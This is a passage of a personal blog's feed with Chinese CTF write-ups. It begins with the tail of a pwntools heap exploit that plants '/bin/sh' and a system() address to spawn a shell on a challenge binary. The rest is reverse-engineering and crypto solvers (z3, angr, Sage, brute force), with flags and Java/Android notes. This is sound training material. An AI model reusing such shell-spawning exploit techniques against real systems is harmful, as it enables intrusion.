class="number">0x38</span>)<span class="comment">#malloc(0x38)</span></span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">0</span>) + p8(<span class="number">0x40</span>) + <span class="string">"/bin/sh\x00"</span></span><br><span class="line">ins += p8(<span class="number">0</span>) + p8(<span class="number">0x40</span>) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">ins += p8(<span class="number">8</span>)<span class="comment">#end</span></span><br><span class="line"></span><br><span class="line">print(hex(len(ins)))</span><br><span class="line"></span><br><span class="line">execute(ins)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="CTF以外"><a href="#CTF以外" class="headerlink" title="CTF以外"></a>CTF以外</h2><p>主要是项目方面的收获，因为java和android我都是零基础，所以有必要记录一下。</p><p>1.IDEA打包jar包流程，不注意的话可能还是有问题，参照下面链接，比如(MF文件尽量放外面，比如项目最外面)。</p><p><a href="https://blog.csdn.net/weixin_42089175/article/details/89113271" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42089175/article/details/89113271</a></p><p>2.如下报错解决办法</p><h6 id="java-lang-SecurityException-Invalid-signature-file-digest-for-Manifest-main-attributes"><a href="#java-lang-SecurityException-Invalid-signature-file-digest-for-Manifest-main-attributes" class="headerlink" title="java.lang.SecurityException: Invalid signature file digest for Manifest main attributes"></a>java.lang.SecurityException: Invalid signature file digest for Manifest main attributes</h6><p>jar包的META-INF下有一些SF，RSA文件要删掉</p><p>zip -d your.jar ‘META-INF/.SF’ ‘META-INF/.RSA’ ‘META-INF/*SF’</p><p>3.安卓调试</p><p>smalidea插件的安装。在as较高版本中好像没用，详情参考如下：</p><p><a href="https://blog.csdn.net/binbin594738977/article/details/106571844" target="_blank" rel="noopener">https://blog.csdn.net/binbin594738977/article/details/106571844</a></p><p>总的来说就是4.0默认的smali support插件来识别smali,导致轮不到smalidea。把file types改了就好了。</p><p>4.还有一些flowdroid,soot的经验，攒着后面单独发一个把。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Record&quot;&gt;&lt;a href=&quot;#Record&quot; class=&quot;headerlink&quot; title=&quot;Record&quot;&gt;&lt;/a&gt;Record&lt;/h1&gt;&lt;p&gt;记录一下最近做的事&lt;/p&gt;
&lt;h2 id=&quot;NCTF2020&quot;&gt;&lt;a href=&quot;#NCTF2020&quot; cl</summary>
      
    
    
    
    
    <category term="Record" scheme="http://pidanxu.github.io/tags/Record/"/>
    
  </entry>
  
  <entry>
    <title>2020西湖论剑-逆向</title>
    <link href="http://pidanxu.github.io/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E9%80%86%E5%90%91/"/>
    <id>http://pidanxu.github.io/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E9%80%86%E5%90%91/</id>
    <published>2020-10-15T12:41:34.000Z</published>
    <updated>2020-10-15T12:46:35.128Z</updated>
    
    <content type="html"><![CDATA[<h2 id="西湖论剑-Reverse-Cellular"><a href="#西湖论剑-Reverse-Cellular" class="headerlink" title="西湖论剑-Reverse-Cellular"></a>西湖论剑-Reverse-Cellular</h2><h3 id="做法1"><a href="#做法1" class="headerlink" title="做法1"></a>做法1</h3><p>好久没更新博客了，我开始了。</p><p>这是一个蜂窝寻路题，下面这个函数在根据map的字符串数组构建地图。</p><img src="/2020/10/15/2020西湖论剑-逆向/1.png"><p>地图如下</p><img src="/2020/10/15/2020西湖论剑-逆向/2.jpg"><p>然后输入L,R进行路劲探索，R是逆时针，L是顺时针，如果下一步是之前走过的就停下，如果下一步是’+’号直接挂掉。需要遍历所有’-‘号，从’*’到’#’。代表性实现部分如下:其实就是判断目前所在方位然后决定顺时针/逆时针的方向路线(在题目中一个节点有2，3，4三个方向可以走)。</p><img src="/2020/10/15/2020西湖论剑-逆向/3.png"><p>最后走出来就是答案，路线如下:</p><img src="/2020/10/15/2020西湖论剑-逆向/4.png"><h3 id="做法2"><a href="#做法2" class="headerlink" title="做法2"></a>做法2</h3><p>acd的做法…直接把程序patch了来dfs。patch成只要路能走完，不碰到’+’就成功。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">length=<span class="number">25</span></span><br><span class="line">route=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs_fake</span><span class="params">(route)</span>:</span></span><br><span class="line">p=subprocess.Popen(<span class="string">"Cellular.exe"</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">out,err=p.communicate(route + <span class="string">"\r\n"</span>)</span><br><span class="line">data=out</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">p.terminate()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Wrong~'</span> <span class="keyword">in</span> data <span class="keyword">or</span> len(data)==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs_real</span><span class="params">(route)</span>:</span></span><br><span class="line">p=subprocess.Popen(<span class="string">"Cellular_real.exe"</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">out,err=p.communicate(route+<span class="string">'\r\n'</span>)</span><br><span class="line">data=out</span><br><span class="line">p.terminate()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Wrong~'</span> <span class="keyword">in</span> data <span class="keyword">or</span> len(data)==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span><span class="params">(route)</span>:</span></span><br><span class="line"><span class="keyword">print</span> route</span><br><span class="line"><span class="keyword">if</span> dfs_fake(route):</span><br><span class="line"><span class="keyword">if</span> dfs_real(route):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'get flag'</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (len(route)&gt;length):</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">bruteforce(route+<span class="string">'L'</span>)</span><br><span class="line">bruteforce(route+<span class="string">'R'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">bruteforce(<span class="string">'R'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;西湖论剑-Reverse-Cellular&quot;&gt;&lt;a href=&quot;#西湖论剑-Reverse-Cellular&quot; class=&quot;headerlink&quot; title=&quot;西湖论剑-Reverse-Cellular&quot;&gt;&lt;/a&gt;西湖论剑-Reverse-Cellular&lt;/</summary>
      
    
    
    
    
    <category term="reverse" scheme="http://pidanxu.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯</title>
    <link href="http://pidanxu.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
    <id>http://pidanxu.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/</id>
    <published>2020-05-10T14:20:27.000Z</published>
    <updated>2020-05-14T03:17:05.887Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h2><p>用frida脱壳后，明文flag：flag{borring_things}</p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>vm，逻辑如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">read flag</span><br><span class="line">stack=16 ^ flag[0]</span><br><span class="line">flag[0]=stack</span><br><span class="line">stack=flag[0]-5</span><br><span class="line">v4[0]=stack</span><br><span class="line">stack=32 ^ flag[1]</span><br><span class="line">flag[1]=stack</span><br><span class="line">stack=flag[1]*3</span><br><span class="line">v4[1]=stack</span><br><span class="line">stack=flag[2]-2</span><br><span class="line">flag[2]=stack</span><br><span class="line">stack=input[2]-1</span><br><span class="line">v4[2]=stack</span><br><span class="line">stack=input[3]+1</span><br><span class="line">flag[3]=stack</span><br><span class="line">stack=4 ^ flag[3]</span><br><span class="line">v4[3]=stack</span><br><span class="line">stack=flag[4]*3</span><br><span class="line">flag[4]=stack</span><br><span class="line">stack=flag[4]-33</span><br><span class="line">v4[4]=stack</span><br><span class="line">stack=input[5]-1</span><br><span class="line">flag[5]=stack</span><br><span class="line">stack=input[5]-1</span><br><span class="line">v4[5]=stack</span><br><span class="line">stack=9 ^ flag[6]</span><br><span class="line">flag[6]=stack</span><br><span class="line">stack=flag[6]-32</span><br><span class="line">v4[6]=stack</span><br><span class="line">stack=flag[7]+81</span><br><span class="line">flag[7]=stack</span><br><span class="line">stack=36 ^ flag[7]</span><br><span class="line">v4[7]=stack</span><br><span class="line">stack=input[8]+1</span><br><span class="line">flag[8]=stack</span><br><span class="line">stack=input[8]-1</span><br><span class="line">v4[8]=stack</span><br><span class="line">stack=flag[9]*2</span><br><span class="line">flag[9]=stack</span><br><span class="line">stack=flag[9]+37</span><br><span class="line">v4[9]=stack</span><br><span class="line">stack=flag[10]+54</span><br><span class="line">flag[10]=stack</span><br><span class="line">stack=65 ^ flag[10]</span><br><span class="line">v4[10]=stack</span><br><span class="line">stack=flag[11]+32</span><br><span class="line">flag[11]=stack</span><br><span class="line">stack=flag[11]*1</span><br><span class="line">v4[11]=stack</span><br><span class="line">stack=flag[12]*3</span><br><span class="line">flag[12]=stack</span><br><span class="line">stack=flag[12]+37</span><br><span class="line">v4[12]=stack</span><br><span class="line">stack=9 ^ flag[13]</span><br><span class="line">flag[13]=stack</span><br><span class="line">stack=flag[13]-32</span><br><span class="line">v4[13]=stack</span><br><span class="line">stack=flag[14]+65</span><br><span class="line">flag[14]=stack</span><br><span class="line">stack=input[14]+1</span><br><span class="line">v4[14]=stack</span><br><span class="line">assert(v4[0]==0x22)</span><br><span class="line">assert(v4[1]==0x3f)</span><br><span class="line">assert(v4[2]==0x34)</span><br><span class="line">assert(v4[3]==0x32)</span><br><span class="line">assert(v4[4]==0x72)</span><br><span class="line">assert(v4[5]==0x33)</span><br><span class="line">assert(v4[6]==0x18)</span><br><span class="line">assert(v4[7]==0xffffffa7)</span><br><span class="line">assert(v4[8]==0x31)</span><br><span class="line">assert(v4[9]==0xfffffff1)</span><br><span class="line">assert(v4[10]==0x28)</span><br><span class="line">assert(v4[11]==0xffffff84)</span><br><span class="line">assert(v4[12]==0xffffffc1)</span><br><span class="line">assert(v4[13]==0x1e)</span><br><span class="line">assert(v4[14]==0x7a)</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>flag{757515121f3d478}</p><h2 id="joker"><a href="#joker" class="headerlink" title="joker"></a>joker</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag=input()</span></span><br><span class="line">final=[<span class="number">0x00000066</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000063</span>, <span class="number">0x00000064</span>, <span class="number">0x0000007F</span>, <span class="number">0x00000061</span>, <span class="number">0x00000067</span>, <span class="number">0x00000064</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000056</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000061</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000026</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000050</span>, <span class="number">0x00000063</span>, <span class="number">0x0000005F</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000071</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000037</span>, <span class="number">0x00000066</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line"><span class="keyword">if</span>(i&amp;<span class="number">1</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'%d:%s'</span>%(i,chr(final[i]+i))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'%d:%s'</span>%(i,chr(final[i]^i))</span><br><span class="line">check1=[<span class="number">0x0000000E</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000013</span>, <span class="number">0x00000005</span>, <span class="number">0x00000058</span>, <span class="number">0x00000056</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000003C</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000057</span>, <span class="number">0x00000014</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000057</span>, <span class="number">0x00000059</span>, <span class="number">0x0000000D</span>]</span><br><span class="line"><span class="comment">#flag&#123;d07abccf8a410c2345&#125;</span></span><br><span class="line">check2=<span class="string">'hahahaha_do_you_find_me?'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">flag+=chr(ord(check2[i])^check1[i])</span><br><span class="line">check3=[<span class="number">0x25</span>,<span class="number">0x74</span>,<span class="number">0x70</span>,<span class="number">0x26</span>,<span class="number">0x3A</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">flag+=chr(<span class="number">0x47</span>^check3[i])</span><br><span class="line"><span class="comment">#flag&#123;fak3_alw35_sp_me!!&#125;</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you raise me up"></a>you raise me up</h2><p><a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a>  sage 在线运行网站</p><p>离散对数问题，参考<a href="https://blog.csdn.net/qq_39642801/article/details/104158699" target="_blank" rel="noopener">https://blog.csdn.net/qq_39642801/article/details/104158699</a>，利用sage求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line">n=<span class="number">2</span>**<span class="number">512</span></span><br><span class="line">ans=discrete_log(mod(c,n),mod(m,n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2str</span><span class="params">(s)</span>:</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    mystr=<span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;len(s)):</span><br><span class="line">        mystr+=chr(<span class="number">16</span>*int(s[i],<span class="number">16</span>)+int(s[i+<span class="number">1</span>],<span class="number">16</span>))</span><br><span class="line">        i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> mystr</span><br><span class="line"></span><br><span class="line">hex2str(hex(ans)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>得flag:’flag{5f95ca93-1594-762d-ed0b-a9139692cb4a}’</p><h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p>第一段md5值可以在cmd5中求得为en5oy</p><p>第二段解方程x=74,y=68,z=31</p><p>第三段解方程x=89127561</p><p>flag{en5oy_746831_89127561}  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Re&quot;&gt;&lt;a href=&quot;#Re&quot; class=&quot;headerlink&quot; title=&quot;Re&quot;&gt;&lt;/a&gt;Re&lt;/h1&gt;&lt;h2 id=&quot;bang&quot;&gt;&lt;a href=&quot;#bang&quot; class=&quot;headerlink&quot; title=&quot;bang</summary>
      
    
    
    
    <category term="ctf wp" scheme="http://pidanxu.github.io/categories/ctf-wp/"/>
    
    
    <category term="reverse" scheme="http://pidanxu.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>2020虎符杯逆向题解</title>
    <link href="http://pidanxu.github.io/2020/04/22/2020%E8%99%8E%E7%AC%A6%E6%9D%AF%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"/>
    <id>http://pidanxu.github.io/2020/04/22/2020%E8%99%8E%E7%AC%A6%E6%9D%AF%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/</id>
    <published>2020-04-22T04:50:26.000Z</published>
    <updated>2020-05-10T14:23:00.317Z</updated>
    
    <content type="html"><![CDATA[<h3 id="enc"><a href="#enc" class="headerlink" title="enc"></a>enc</h3><p>这个题需要记录两点:</p><p>1.碰到一时识别不了的加密算法尝试用angr莽?</p><p> 2.rc6算法特点:很多ROL?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> claripy <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#timestamp=1575018225 0x5de0def1</span></span><br><span class="line">flag = BVS(<span class="string">'flag'</span>, <span class="number">8</span> * <span class="number">16</span>)</span><br><span class="line">result = BVV(<span class="string">b'\xae\xed\x13\x5c\xbd\xd2\xa1\x74\x9c\x4c\x5e\x02\xd3\x28\x9b\x60'</span>, <span class="number">8</span> * <span class="number">16</span>)</span><br><span class="line">disasm = BVV(<span class="string">b'794c87696d24d16e7b9e3dddad778c93'</span>, <span class="number">8</span> * <span class="number">32</span>)</span><br><span class="line">p = Project(<span class="string">'task.exe'</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#p.hook(0x403610, SIM_PROCEDURES['libc']['srand']())</span></span><br><span class="line"><span class="comment">#p.hook(0x4035ef, SIM_PROCEDURES['libc']['rand']())</span></span><br><span class="line"><span class="comment">#p.hook(0x405128, SIM_PROCEDURES['libc']['malloc']())</span></span><br><span class="line"><span class="comment">#p.hook(0x4035e4, SIM_PROCEDURES['libc']['calloc']())</span></span><br><span class="line">st = p.factory.full_init_state(addr=<span class="number">0x40154d</span>, add_options=&#123;options.SYMBOLIC_WRITE_ADDRESSES,</span><br><span class="line">                                                           options.REGION_MAPPING,</span><br><span class="line">                                                           options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;)</span><br><span class="line">st.memory.store(st.regs.ebp, BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line">st.memory.store(st.regs.ebp - <span class="number">0x24</span>, flag)</span><br><span class="line">st.memory.store(st.regs.ebp - <span class="number">0x54</span>, disasm)</span><br><span class="line">sim = p.factory.simgr(st)</span><br><span class="line">sim.explore(find=<span class="number">0x401558</span>)</span><br><span class="line">f = sim.one_found</span><br><span class="line">f.solver.add(f.memory.load(f.regs.ebp - <span class="number">0x24</span>, <span class="number">16</span>) == result)</span><br><span class="line">print(f.solver.eval(flag, cast_to=bytes))</span><br></pre></td></tr></table></figure><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>python字节码可以参考</p><p><a href="https://zhuanlan.zhihu.com/p/45101508" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/45101508</a> </p><p><a href="https://docs.python.org/3.5/library/dis.html#python-bytecode-instructions" target="_blank" rel="noopener">https://docs.python.org/3.5/library/dis.html#python-bytecode-instructions</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_models</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> s.check() == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        <span class="keyword">yield</span> m</span><br><span class="line">        s.add(Or([sym() != m[sym] <span class="keyword">for</span> sym <span class="keyword">in</span> m.decls()]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first_enc</span><span class="params">(input,input2)</span>:</span></span><br><span class="line">inpt=input[:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(inpt)):</span><br><span class="line">inpt[i]=input[i]^input2[i]</span><br><span class="line"><span class="keyword">return</span> inpt</span><br><span class="line">arr0 = [<span class="number">249</span>,<span class="number">91</span>,<span class="number">149</span>,<span class="number">113</span>,<span class="number">16</span>,<span class="number">91</span>,<span class="number">53</span>,<span class="number">41</span>]</span><br><span class="line">arr1 = [<span class="number">43</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">69</span>,<span class="number">20</span>,<span class="number">62</span>,<span class="number">6</span>,<span class="number">44</span>,<span class="number">24</span>,<span class="number">113</span>,<span class="number">6</span>,<span class="number">35</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">44</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">127</span>,<span class="number">60</span>]</span><br><span class="line">arr2 = [ <span class="number">90</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">109</span>, <span class="number">86</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">90</span>, <span class="number">104</span>, <span class="number">88</span>, <span class="number">102</span>]</span><br><span class="line">arr = [BitVec(<span class="string">'arr[%d]'</span>%i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">39</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(arr[<span class="number">0</span>]==ord(<span class="string">'f'</span>))</span><br><span class="line">s.add(arr[<span class="number">1</span>]==ord(<span class="string">'l'</span>))</span><br><span class="line">s.add(arr[<span class="number">2</span>]==ord(<span class="string">'a'</span>))</span><br><span class="line">s.add(arr[<span class="number">3</span>]==ord(<span class="string">'g'</span>))</span><br><span class="line">s.add(arr[<span class="number">4</span>]==ord(<span class="string">'&#123;'</span>))</span><br><span class="line">s.add(arr[<span class="number">5</span>]==ord(<span class="string">'5'</span>))</span><br><span class="line">s.add(arr[<span class="number">38</span>]==ord(<span class="string">'&#125;'</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">s.add(arr[i]&lt;<span class="number">128</span>)</span><br><span class="line">s.add(arr[i]&gt;<span class="number">32</span>)</span><br><span class="line">a = arr[<span class="number">6</span>:<span class="number">30</span>:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">s.add((a[i]*<span class="number">17684</span>+<span class="number">372511</span>)%<span class="number">257</span>==arr0[i])</span><br><span class="line">b = arr[<span class="number">-2</span>:<span class="number">33</span>:<span class="number">-1</span>]*<span class="number">5</span></span><br><span class="line">c = first_enc(b,arr[<span class="number">7</span>:<span class="number">27</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">s.add(c[i]==arr1[i])</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">28</span>,<span class="number">34</span>):</span><br><span class="line">s.add((arr[i]+<span class="number">107</span>)/<span class="number">16</span>+<span class="number">77</span> ==arr2[p])</span><br><span class="line">s.add((arr[i]+<span class="number">117</span>)%<span class="number">16</span>+<span class="number">99</span>==arr2[p+<span class="number">1</span>])</span><br><span class="line">p+=<span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> get_models(s):</span><br><span class="line">serial = [m[arr[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">39</span>)]</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> serial: key += chr(_)</span><br><span class="line"><span class="keyword">print</span> key</span><br></pre></td></tr></table></figure><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 